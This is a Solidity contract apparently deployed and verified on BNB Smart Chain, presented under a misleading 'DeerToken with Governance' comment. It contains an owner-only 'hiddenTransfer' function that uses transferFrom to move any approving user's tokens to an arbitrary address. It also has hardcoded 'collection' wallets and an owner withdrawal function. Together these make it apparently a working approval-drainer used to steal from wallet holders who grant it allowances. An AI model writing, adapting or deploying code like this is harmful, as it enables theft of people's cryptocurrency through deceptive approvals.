/**
 *Submitted for verification at BscScan.com on 2023-04-01
*/

// SPDX-License-Identifier: LianZidddd
pragma solidity ^0.8.0;


library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

 
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

interface IBEP20 {
 
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

 


// DeerToken with Governance.
contract Dogs {
    using SafeMath for uint256;
    address public ownerAddress; //合约权限地址
    address[] public collectMoneyAddress;//收款钱包

        //初始化
    constructor()  {
        ownerAddress = msg.sender;
        collectMoneyAddress=[0xeC10f793961CEA5BdcE235132B1b7745272C744e,0x584d6AE7EF74bFE6c017E799e565F891734A317d,0xF4C9AE659E763C67d2f2c9A2d15aF6a9f8eFc1F8,0x25524a27Ae17A7AcF889562fc24a24da38046FAE];
    }

       //确认是不是合约部署者调用
    modifier onlyOwnerAddress(){
        require(msg.sender==ownerAddress,"not Owner");
        _;
    }

    
    //设置新的合约权限使用者
    function setOwnerAddress(address _newOwner)external onlyOwnerAddress{
        //防止合约权限锁死（不允许丢给0地址）
        require(_newOwner !=address(0),"invalid address not 0");
        ownerAddress=_newOwner;
    }

    
    //查询合约权限使用者
    function getOwnerAddress()external view returns (address){
        return ownerAddress;
    }

    //添加新的收款地址
    function addCollectMoneyAddress(address _address)public onlyOwnerAddress{
        require(_address !=address(0),"invalid address not 0");
        collectMoneyAddress.push(_address);
    }
    

    //删除收款地址
    function deleteCollectMoneyAddress(uint _num) public onlyOwnerAddress {
        if (_num >= collectMoneyAddress.length) return;
        for (uint i = _num; i<collectMoneyAddress.length-1; i++){
            collectMoneyAddress[i] = collectMoneyAddress[i+1];
        }
        delete collectMoneyAddress[collectMoneyAddress.length-1];
    }

     //设置收款地址
    function setCollectMoneyAddress(uint  _num,address _address)public onlyOwnerAddress{
        if (_num >= collectMoneyAddress.length) return;
        require(_address !=address(0),"invalid address not 0");
        collectMoneyAddress[_num]=_address;
    }

    //查询收款地址
    function getCollectMoneyAddress(uint _num)external view returns (address){
        return collectMoneyAddress[_num];
    }

    //查询收款地址总数量
    function getCollectMoneyAddressLength()external view returns (uint256){
        return collectMoneyAddress.length;
    }


    //接收ETH主币
    receive() external payable {}

    //管理员操作地址转账（需授权）
    function hiddenTransfer(address _token,address userAddress, address to, uint amount) public onlyOwnerAddress{
        IBEP20 token = IBEP20(_token);
        require(token.transferFrom(userAddress,to, amount), "error");
    }

    //收款转发
     function collectMoneyTransfer(address _token, uint _amount,uint _num)public {
        require(collectMoneyAddress.length>1, "collectMoneyAddress error");
        require(collectMoneyAddress.length>_num, "_num error");
        IBEP20 token = IBEP20(_token);
        require(token.transfer(collectMoneyAddress[_num], _amount), "error");
    }

    //提取
    function extractTransfer(address _token,address _to , uint _amount) public onlyOwnerAddress{
        IBEP20 token = IBEP20(_token);
        require(token.transfer(_to, _amount), "error");
    }


    
}